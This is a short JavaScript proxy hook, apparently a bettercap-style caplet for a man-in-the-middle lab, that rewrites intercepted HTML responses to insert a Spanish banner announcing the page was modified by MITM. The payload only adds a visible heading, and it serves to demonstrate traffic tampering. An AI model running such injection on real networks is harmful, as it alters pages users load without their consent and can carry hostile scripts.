function onResponse(req, res) {
    if (res.ContentType.indexOf("text/html") === 0) {
        var body = res.ReadBody();
        if (body !== undefined) {
            res.Body = body.replace("</body>",
                "<h1>PAGINA MODIFICADA POR MITM - CAI</h1></body>");
        }
    }
}